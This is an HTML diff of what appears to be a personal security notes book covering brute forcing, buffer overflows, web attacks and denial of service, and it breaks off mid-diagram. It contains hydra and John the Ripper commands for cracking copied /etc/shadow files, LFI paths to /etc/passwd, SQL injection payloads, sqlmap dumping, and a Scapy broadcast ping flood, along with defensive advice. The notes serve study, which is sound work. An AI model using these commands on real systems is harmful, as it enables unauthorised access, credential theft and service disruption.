@@ -1,0 +1,2978 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title></title>
+        <meta name="robots" content="noindex" />
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="./mdbook-admonish.css">
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">Introduction</a></li><li class="spacer"></li><li class="chapter-item affix "><li class="part-title">IT</li><li class="chapter-item "><a href="it/attacks/index.html"><strong aria-hidden="true">1.</strong> Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/attacks/bruteforce/index.html"><strong aria-hidden="true">1.1.</strong> Bruteforce</a></li><li class="chapter-item "><a href="it/attacks/buffer-overflow/index.html"><strong aria-hidden="true">1.2.</strong> Buffer Overflow</a></li><li class="chapter-item "><a href="it/attacks/web/index.html"><strong aria-hidden="true">1.3.</strong> Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/attacks/web/click-and-cursor-jacking/index.html"><strong aria-hidden="true">1.3.1.</strong> Click &amp; Cursor Jacking</a></li><li class="chapter-item "><a href="it/attacks/web/csrf/index.html"><strong aria-hidden="true">1.3.2.</strong> CSRF</a></li><li class="chapter-item "><a href="it/attacks/web/lfi-rfi/index.html"><strong aria-hidden="true">1.3.3.</strong> LFI &amp; RFI</a></li><li class="chapter-item "><a href="it/attacks/web/sqli/index.html"><strong aria-hidden="true">1.3.4.</strong> SQLi</a></li><li class="chapter-item "><a href="it/attacks/web/xss/index.html"><strong aria-hidden="true">1.3.5.</strong> XSS</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.4.</strong> Network</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/attacks/network/ddos/index.html"><strong aria-hidden="true">1.4.1.</strong> DDOS</a></li><li class="chapter-item "><a href="it/attacks/network/dns/index.html"><strong aria-hidden="true">1.4.2.</strong> DNS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/attacks/network/dns/dns-spoofing/index.html"><strong aria-hidden="true">1.4.2.1.</strong> DNS Spoofing</a></li></ol></li><li class="chapter-item "><a href="it/attacks/network/mitm/index.html"><strong aria-hidden="true">1.4.3.</strong> MITM</a></li><li class="chapter-item "><a href="it/attacks/network/network-sniffing/index.html"><strong aria-hidden="true">1.4.4.</strong> Network Sniffing</a></li><li class="chapter-item "><a href="it/attacks/network/network-spoofing/index.html"><strong aria-hidden="true">1.4.5.</strong> Network Spoofing</a></li><li class="chapter-item "><a href="it/attacks/network/wifi/index.html"><strong aria-hidden="true">1.4.6.</strong> Wifi</a></li><li class="chapter-item "><a href="it/attacks/network/zombie-scanning/index.html"><strong aria-hidden="true">1.4.7.</strong> Zombie Scanning</a></li></ol></li><li class="chapter-item "><a href="it/attacks/social-engineering/index.html"><strong aria-hidden="true">1.5.</strong> Social Engineering</a></li></ol></li><li class="chapter-item "><a href="it/OSINT/index.html"><strong aria-hidden="true">2.</strong> OSINT</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/OSINT/google-dorks/index.html"><strong aria-hidden="true">2.1.</strong> Google Dorks</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">3.</strong> Programming</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/programming/go/index.html"><strong aria-hidden="true">3.1.</strong> Go</a></li><li class="chapter-item "><a href="it/programming/python/index.html"><strong aria-hidden="true">3.2.</strong> Python</a></li><li class="chapter-item "><a href="it/programming/rust/index.html"><strong aria-hidden="true">3.3.</strong> Rust</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">4.</strong> AI</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/AI/deepfake-audio/index.html"><strong aria-hidden="true">4.1.</strong> Deepfake audio</a></li><li class="chapter-item "><a href="it/AI/transfer-learning/index.html"><strong aria-hidden="true">4.2.</strong> Transfer learning</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">5.</strong> System</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/system/linux/index.html"><strong aria-hidden="true">5.1.</strong> Linux</a></li><li class="chapter-item "><a href="it/system/filesystem/index.html"><strong aria-hidden="true">5.2.</strong> File system</a></li></ol></li><li class="chapter-item "><a href="it/tools/index.html"><strong aria-hidden="true">6.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/tools/docker/index.html"><strong aria-hidden="true">6.1.</strong> Docker</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/tools/docker/dockerfile/index.html"><strong aria-hidden="true">6.1.1.</strong> Dockerfile</a></li></ol></li><li class="chapter-item "><a href="it/tools/kubernetes/index.html"><strong aria-hidden="true">6.2.</strong> Kubernetes</a></li><li class="chapter-item "><a href="it/tools/git/index.html"><strong aria-hidden="true">6.3.</strong> Git</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/tools/git/git-daemon.html"><strong aria-hidden="true">6.3.1.</strong> Quickly share your git repository</a></li></ol></li><li class="chapter-item "><a href="it/tools/matplotlib/index.html"><strong aria-hidden="true">6.4.</strong> Matplotlib</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">7.</strong> Technics</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/technics/natural-referencing/index.html"><strong aria-hidden="true">7.1.</strong> Natural Referencing</a></li><li class="chapter-item "><a href="it/technics/web-scrapping/index.html"><strong aria-hidden="true">7.2.</strong> Web Scrapping</a></li><li class="chapter-item "><a href="it/technics/reverse-engineering/index.html"><strong aria-hidden="true">7.3.</strong> Reverse Engineering</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/technics/reverse-engineering/complete-analysis-example/index.html"><strong aria-hidden="true">7.3.1.</strong> Complete Analysis Example</a></li></ol></li></ol></li><li class="chapter-item "><a href="it/pentest/index.html"><strong aria-hidden="true">8.</strong> Pentest</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="it/pentest/recognition/index.html"><strong aria-hidden="true">8.1.</strong> Recognition</a></li><li class="chapter-item "><a href="it/pentest/scanning/index.html"><strong aria-hidden="true">8.2.</strong> Scanning</a></li><li class="chapter-item "><a href="it/pentest/exploit/index.html"><strong aria-hidden="true">8.3.</strong> Exploit</a></li><li class="chapter-item "><a href="it/pentest/persistence/index.html"><strong aria-hidden="true">8.4.</strong> Persistence</a></li><li class="chapter-item "><a href="it/pentest/clearing-tracks/index.html"><strong aria-hidden="true">8.5.</strong> Clearing Tracks</a></li><li class="chapter-item "><a href="it/pentest/useful-commands/index.html"><strong aria-hidden="true">8.6.</strong> Useful Commands</a></li></ol></li><li class="chapter-item "><li class="part-title">CTF Write Up</li><li class="chapter-item "><div><strong aria-hidden="true">9.</strong> Over The Wire</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="ctf-write-up/over-the-wire/bandit/index.html"><strong aria-hidden="true">9.1.</strong> Bandit</a></li><li class="chapter-item "><a href="ctf-write-up/over-the-wire/leviathan/index.html"><strong aria-hidden="true">9.2.</strong> Leviathan</a></li><li class="chapter-item "><a href="ctf-write-up/over-the-wire/natas/index.html"><strong aria-hidden="true">9.3.</strong> Natas</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">10.</strong> TryHackMe</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="ctf-write-up/try-hack-me/simple_ctf/index.html"><strong aria-hidden="true">10.1.</strong> Simple CTF</a></li><li class="chapter-item "><a href="ctf-write-up/try-hack-me/vulnversity/index.html"><strong aria-hidden="true">10.2.</strong> Vulnversity</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/Bilou4/bilou4.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="attacks"><a class="header" href="#attacks">Attacks</a></h1>
+<ul>
+<li><a href="it/attacks/./bruteforce/index.html">Bruteforce</a></li>
+<li><a href="it/attacks/./buffer-overflow/index.html">Buffer Overflow</a></li>
+<li><a href="it/attacks/./web/index.html">Web</a>
+<ul>
+<li><a href="it/attacks/./web/lfi-rfi/index.html">LFI &amp; RFI</a></li>
+<li><a href="it/attacks/./web/sqli/index.html">SQLi</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="some-interesting-links"><a class="header" href="#some-interesting-links">Some interesting links</a></h2>
+<ul>
+<li><a href="https://trojansource.codes">https://trojansource.codes</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="bruteforce"><a class="header" href="#bruteforce">Bruteforce</a></h1>
+<p>Brute-force attacks work by calculating every possible combination that could make up a password and testing it to see if it is the correct password. Be aware that, as the password's length increases, the amount of time, on average, to find the correct password increases exponentially.</p>
+<h2 id="hydra"><a class="header" href="#hydra">Hydra</a></h2>
+<p>Hydra: tool developed by THC (The Hacker's Choice), uses bruteforce attacks on different protocols</p>
+<pre><code class="language-sh">hydra -l root -x 1:9:aA1 [@IP] ssh
+</code></pre>
+<ul>
+<li>l : username to test for</li>
+<li>x: the tested password will have between 1 and 9 characters with upper and lower case letters and numbers</li>
+</ul>
+<pre><code class="language-sh">hydra -V -L usernames.txt -P pass.txt [@IP] [protocol] # performs the combinations between each word in the text files.
+</code></pre>
+<pre><code class="language-sh">hydra [@Host] -V -L usernames.txt -P pass.txt http-get-form &quot;path/to/the/form/:username=^USER^&amp;password=^PASS^&amp;Login:F-incorrect:H=cookie:PHPSESSID=[cookie];security=high&quot;
+
+
+# Login = name of the button and repeat as long as it is incorrect
+</code></pre>
+<hr />
+<h2 id="john-the-ripper-jtr"><a class="header" href="#john-the-ripper-jtr">John The Ripper (JTR)</a></h2>
+<h3 id="default-use"><a class="header" href="#default-use">Default use</a></h3>
+<pre><code class="language-sh">john --wordlist=[wordListFile] [file-to-crack] # To make a crack based on a wordList
+</code></pre>
+<pre><code class="language-sh">john --list=formats # all hash types that can be cracked by JTR
+</code></pre>
+<h3 id="crack-etcshadow"><a class="header" href="#crack-etcshadow">Crack /etc/shadow</a></h3>
+<pre><code class="language-sh">cp /etc/passwd ./
+cp /etc/shadow ./
+unshadow passwd shadow &gt; passwords
+john passwords # automatic detection of the hash and starts cracking (press a key to know the evolution (except 'q' because it quits)
+john -show passwords # in the folder where the crack is made =&gt; to check what has been found
+</code></pre>
+<h3 id="recovering-the-passphrase-of-a-private-key"><a class="header" href="#recovering-the-passphrase-of-a-private-key">Recovering the passphrase of a private key</a></h3>
+<pre><code class="language-sh">ssh2john id_rsa &gt; hash.txt
+</code></pre>
+<hr />
+<h2 id="cewl-custom-wordlist-generator"><a class="header" href="#cewl-custom-wordlist-generator">CeWL (Custom WordList Generator)</a></h2>
+<p>https://github.com/digininja/CeWL</p>
+<p>Tools to create a list of words based on a URL.</p>
+<pre><code class="language-sh">cewl --depth 2 --min_word_length 5 --write words.txt https://example.com
+</code></pre>
+<hr />
+<h2 id="crunch"><a class="header" href="#crunch">crunch</a></h2>
+<p>Generates wordLists if you know how the user created his password</p>
+<pre><code class="language-sh">crunch [min_word_length] [max_word_length] -t pass@@ &gt;&gt; wordlist.txt`
+</code></pre>
+<p>The '@' characters are generated by the command. (For numbers, use '%').</p>
+<hr />
+<h2 id="bruteforce-an-argument-of-a-program"><a class="header" href="#bruteforce-an-argument-of-a-program">Bruteforce an argument of a program</a></h2>
+<p>If you need to bruteforce an argument of a program.</p>
+<pre><code class="language-sh">strings random.dic &gt; list.txt
+while read LINE; do ./program &quot;$LINE&quot;; done &lt; list.txt
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="buffer-overflow"><a class="header" href="#buffer-overflow">Buffer Overflow</a></h1>
+<h2 id="introduction---the-basics"><a class="header" href="#introduction---the-basics">Introduction - The Basics</a></h2>
+<p>Managing the memory of a binary:</p>
+<ul>
+<li>https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</li>
+</ul>
+<h3 id="memory-segments"><a class="header" href="#memory-segments">Memory Segments</a></h3>
+<ul>
+<li><strong>code</strong>: contains the instructions to be executed. The instructions are not linear (presence of jumps to other addresses). It is a fixed size segment, read-only. If the program is run several times, this segment will only be present once in RAM.</li>
+<li><strong>data</strong>: used to store <em>initialized</em> global and static variables. The segment is of fixed size, readable and writable.</li>
+<li><strong>bss</strong>: allows you to store <em>uninitialized</em> global and static variables. Fixed size segment, readable and writable.</li>
+<li><strong>heap</strong>: A segment used by the programmer to allocate memory. Once used, these blocks must be deallocated. It varies in size as the program uses it. It has a growing size towards the bottom (high memory addresses).</li>
+<li><strong>stack</strong>: A variable size segment that contains the environment (function activation block) of each function, its parameters, its variables, the return address.</li>
+</ul>
+<h2 id="buffer-overflow-bof"><a class="header" href="#buffer-overflow-bof">Buffer Overflow (BOF)</a></h2>
+<p>The flaw: copying data without checking the size. This is a bug whereby a process, when writing to a buffer, writes outside the space allocated to the buffer, thereby overwriting information needed by the process. The aim is to make the process execute instructions.</p>
+<h2 id="security"><a class="header" href="#security">Security</a></h2>
+<p>It is impossible to eradicate application vulnerabilities because the processor does not differentiate between code and data. But there are ways of protecting against them:</p>
+<ul>
+<li><strong>ASLR (Address Space Layout Randomization)</strong>: allows data zones to be placed randomly in virtual memory (position of heap, stack, libraries). This limits the effect of BOF attacks. <code>ldd /bin/sh</code> is used to check when a process changes address.</li>
+<li><strong>Bit NX (non-executable memory page)</strong>: Technique used in processors to separate areas of memory containing instructions, i.e. executable instructions, from areas containing data.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
+<h2 id="few-more-things"><a class="header" href="#few-more-things">Few more things</a></h2>
+<p>Here are few extra tricks that don't require a full page</p>
+<h3 id="designmode"><a class="header" href="#designmode">DesignMode</a></h3>
+<p>It controls whether the entire document is editable.
+Handy for quickly editing text on a web page.</p>
+<pre><code class="language-js">document.DesignMode = 'on'; // off
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="click--cursor-jacking"><a class="header" href="#click--cursor-jacking">Click &amp; Cursor Jacking</a></h1>
+<p>Clickjacking: a malicious way to trick a user into providing confidential information or taking control of their computer by tricking them into clicking on apparently safe pages.</p>
+<p><img src="it/attacks/web/click-and-cursor-jacking/./img/clickjacking.png" alt="click jacking example" /></p>
+<h1 id="cursor-jacking"><a class="header" href="#cursor-jacking">Cursor jacking</a></h1>
+<p>Aims to create an offset between where you appear to click and where you actually click. This allows you to click anywhere.</p>
+<p>Example of cursor jacking code: <a href="http://blog.kotowicz.net/2012/01/cursorjacking-again.html">cursor jacking example</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf-cross-site-request-forgery"><a class="header" href="#csrf-cross-site-request-forgery">CSRF (Cross Site Request Forgery)</a></h1>
+<p>The victim's browser generates a request to a vulnerable web application.</p>
+<p>This vulnerability is caused by the ability of browsers to automatically send authentication data in each request.</p>
+<p><strong>authentication data</strong> :</p>
+<ul>
+<li>session cookie</li>
+<li>HTTP authentication header</li>
+<li>IP address</li>
+<li>client SSL certificate</li>
+</ul>
+<h2 id="protect-yourself"><a class="header" href="#protect-yourself">Protect yourself:</a></h2>
+<ul>
+<li>add a token, not sent automatically, to all sensitive requests =&gt; this makes it impossible for the attacker to submit a valid request</li>
+<li>tokens must be cryptographically secure</li>
+<li>store a single token in the session and add it to all forms and links</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="lfi--rfi"><a class="header" href="#lfi--rfi">LFI &amp; RFI</a></h1>
+<h2 id="lfi"><a class="header" href="#lfi">LFI</a></h2>
+<p>allows a user to inject local files from a vulnerable URL</p>
+<h3 id="examples"><a class="header" href="#examples">Examples</a></h3>
+<pre><code class="language-sh">url...?page=include.php # replace include.php with a server file
+url...?page=/etc/passwd
+</code></pre>
+<h3 id="include-flaw"><a class="header" href="#include-flaw">Include flaw</a></h3>
+<p><code>&lt;?php include('config.php'); ?&gt;</code></p>
+<p><strong>Can be exploited in</strong> :</p>
+<ul>
+<li>Local File Include (a local file to the server)</li>
+<li>Remote File Include (a shell)</li>
+</ul>
+<h4 id="protect-yourself-from-this"><a class="header" href="#protect-yourself-from-this">Protect yourself from this:</a></h4>
+<ul>
+<li>make sure that the pages you include are on your server</li>
+<li>function: file_exists('name');</li>
+<li>configuration .HTACCESS</li>
+</ul>
+<h3 id="faulty-upload"><a class="header" href="#faulty-upload">Faulty upload</a></h3>
+<p>Allows you to backdoor a server by executing a server-side script</p>
+<p><strong>Can be exploited in</strong> :</p>
+<ul>
+<li>double extension: <code>shell.php.jpg</code>;</li>
+<li>bypass mime verification: change the name of the script</li>
+<li>bypass mime verification: change the type of file being uploaded</li>
+<li>Selecting the destination directory</li>
+</ul>
+<h4 id="protecting-yourself"><a class="header" href="#protecting-yourself">Protecting yourself:</a></h4>
+<ul>
+<li>Rename files with random names and without extension</li>
+<li>Do not use the characters <code>&lt; &gt; ? &amp; ;</code> but watch out for their equivalent in other encodings (urlencoding, ascii...)</li>
+<li>limit the case =&gt; forbid the execution of critical functions at the server level</li>
+<li>.HTACCESS configuration</li>
+</ul>
+<h3 id="rfi"><a class="header" href="#rfi">RFI</a></h3>
+<p>allows to include a remote file (mainly shell - command execution...)</p>
+<pre><code class="language-sh">url...?page=include.php
+
+url...?page=http://www.google.fr # will add the google page to the page
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injections"><a class="header" href="#sql-injections">SQL injections</a></h1>
+<h2 id="concept"><a class="header" href="#concept">Concept</a></h2>
+<ul>
+<li>consists of sending data to an application that will generate a bug</li>
+<li>uses strings and interprets them as commands</li>
+<li>allows access and modification of the database</li>
+</ul>
+<p><strong>Example</strong>: <code>' OR 1=1 {option}; -- </code></p>
+<p><strong>{option}</strong> can be:</p>
+<pre><code class="language-sql">select null, version()
+select null, table_name from information_schema.tables # retrieve tables from the database
+select null, column_name from information_schema.columns where information_schema.tables='[name]'
+...
+</code></pre>
+<h3 id="example"><a class="header" href="#example">Example</a></h3>
+<pre><code class="language-go">// Correct format for executing an SQL statement with parameters.
+rows, err := db.Query(&quot;SELECT * FROM user WHERE id = ?&quot;, id)
+
+// SECURITY RISK!
+rows, err := db.Query(fmt.Sprintf(&quot;SELECT * FROM user WHERE id = %s&quot;, id))
+</code></pre>
+<p><a href="https://go.dev/doc/database/sql-injection">source example</a></p>
+<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
+<h3 id="sqlmap"><a class="header" href="#sqlmap">SQLMAP</a></h3>
+<p>SQLMAP is a tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.</p>
+<pre><code class="language-bash">-u &quot;url&quot;
+--cookie=&quot;PHPSESSID=.... ; security=low&quot;
+--dump # dump the database
+</code></pre>
+<h2 id="protect-yourself-from-it"><a class="header" href="#protect-yourself-from-it">Protect yourself from it</a></h2>
+<ul>
+<li>Escaping all user supplied input</li>
+<li>perform white list validation on user data</li>
+<li>minimize database privileges</li>
+<li>Use of Prepared Statements (with Parameterized Queries)</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-cross-site-scripting-vulnerabilities"><a class="header" href="#xss-cross-site-scripting-vulnerabilities">XSS (Cross-Site Scripting) vulnerabilities</a></h1>
+<p>Allows an attacker to inject malicious client code into a website. This code is executed by victims and allows attackers to bypass access controls and impersonate users.</p>
+<p>Corresponds to sending data to the victim in order to :</p>
+<ul>
+<li>Steal user sessions, sensitive data, rewrite the web page, redirect to a phishing site...</li>
+<li>Observe the client computer or even force the user to a particular site using an XSS proxy.</li>
+</ul>
+<p>Example of a simple payload allowing to know if an input is vulnerable</p>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<h3 id="reflected-xss-not-persistent"><a class="header" href="#reflected-xss-not-persistent">Reflected XSS (not-persistent)</a></h3>
+<p>It is called non-persistent because it is not stored on the server (file or database). This type of XSS flaw does not store the malicious content on the web server. Instead, the content is delivered to the victim through a URL that contains it.</p>
+<h3 id="stored-xss-persistent"><a class="header" href="#stored-xss-persistent">Stored XSS (persistent)</a></h3>
+<p>The persistent XSS flaw is the most dangerous because it will be executed at each loading of the site. Indeed, the latter is stored either in a file or in a database. As an example, an attacker posts a comment on a discussion forum containing the malicious content. When other users go to the page containing the fraudulent message or comment, it will be executed.</p>
+<h2 id="protect-yourself-from-it-1"><a class="header" href="#protect-yourself-from-it-1">Protect yourself from it:</a></h2>
+<ul>
+<li>Convert special characters to HTML entities (<code>htmlsepcialchars()</code>: Example <code>&amp; → &amp;amp; | &quot; → &amp;quot;</code>)</li>
+<li>Filter characters equivalent to html and js coding (<code>htmlentities()</code>)</li>
+<li>Remove tags</li>
+<li>Do not include user-supplied content in the output page</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dos---ddos"><a class="header" href="#dos---ddos">DOS - DDOS</a></h1>
+<h2 id="denial-of-service"><a class="header" href="#denial-of-service">Denial of service</a></h2>
+<p>Concept: Filling a storage area or communication channel until it can no longer be used.</p>
+<h3 id="dos-by-smurf"><a class="header" href="#dos-by-smurf">DoS by smurf</a></h3>
+<ul>
+<li>The attacking machine sends a ping to broadcast servers with a modified source IP address (the one of the target)</li>
+<li>The server echoes the request throughout the network</li>
+<li>All machines respond to the target IP server</li>
+<li>The target receives a lot amount of requests to proceed.</li>
+</ul>
+<h3 id="dos-by-syn-flood"><a class="header" href="#dos-by-syn-flood">DoS by SYN flood</a></h3>
+<ul>
+<li>The attacker sends a high volume of SYN packets to the targeted server, often with spoofed IP addresses.</li>
+<li>The server then responds to each connection request and leaves a port open to receive the response.</li>
+<li>While the server waits for the last ACK packet, which never arrives, the attacker continues to send more SYN packets. The arrival of each new SYN packet forces the server to temporarily keep a new port connection open for a while, and once all available ports have been used, the server can no longer function normally.</li>
+</ul>
+<h3 id="example-1"><a class="header" href="#example-1">Example</a></h3>
+<p><strong>Scapy</strong></p>
+<pre><code class="language-python">i = IP()
+i.dst = &quot;192.168.133.255&quot;
+
+ping = ICMP()
+request = (i/ping)
+send(request) # run wireshark
+
+# in 1 line
+
+send(IP(dst=&quot;192.168.133.255&quot;, src=&quot;192.168.133.129&quot;)/ICMP(), count=1000, verbose=1)
+</code></pre>
+<p>The goal is to make specific services unavailable by generating as many requests as possible to the service to be saturated.</p>
+<p>An attack originating from a single IP address will be limited and easier to block.</p>
+<h2 id="ddos-attack-distributed-denial-of-service"><a class="header" href="#ddos-attack-distributed-denial-of-service">DDOS attack (Distributed Denial of Service)</a></h2>
+<p>The multiplication of the origins of the requests allows</p>
+<ul>
+<li>to obtain a virtually unlimited bandwidth</li>
+<li>to make it almost impossible to block by IP</li>
+</ul>
+<h3 id="reflection-attack"><a class="header" href="#reflection-attack">Reflection attack</a></h3>
+<ul>
+<li>Contacting a large number of machines by providing them with an erroneous source address.</li>
+<li>This address will be replaced by the address of the server to be saturated so that the responses of the machines contacted reach it directly.</li>
+<li>If the number of responses is high enough and/or if the messages received involve significant processing, the target and/or the network will be saturated and their proper functioning compromised.</li>
+</ul>
+<div id="admonition-note" class="admonition admonish-note">
+<div class="admonition-title">
+<p>Note</p>
+<p><a class="admonition-anchor-link" href="it/attacks/network/ddos/index.html#admonition-note"></a></p>
+</div>
+<div>
+<ul>
+<li>UDP has priority over TCP and does not implement a congestion control mechanism.</li>
+<li>UDP works without session =&gt; possibility to modify the source address.</li>
+</ul>
+</div>
+</div>
+<h3 id="amplification-attack"><a class="header" href="#amplification-attack">Amplification attack</a></h3>
+<p>The operation is the same as for the reflection attack but using a protocol with the particularity of sending responses with very large packets (to generate a large traffic).</p>
+<p>The protocols used:</p>
+<ul>
+<li><strong>Network Time Protocol (NTP)</strong>: sends a request to synchronize the machines on the network. The answers are of higher size.</li>
+<li><strong>HTTP</strong>: by requesting resources from the server regularly, we keep an active connection with it. If many malicious machines make periodic requests, the maximum number of connections to the server can be reached and will be unreachable.</li>
+<li><strong>SNMP</strong>: simple version: <strong>Ping of Death</strong>, send a ping with a size larger than the default. This was fixed in 1998 but improved by using amplification. Sending an ICMP REQUEST packet in broadcast. The number of packets increases proportionally to the number of machines in the network.</li>
+</ul>
+<h2 id="dos-wifi"><a class="header" href="#dos-wifi">DOS WIFI</a></h2>
+<pre class="mermaid">sequenceDiagram
+	participant U as USER
+	participant AP as AccessPoint
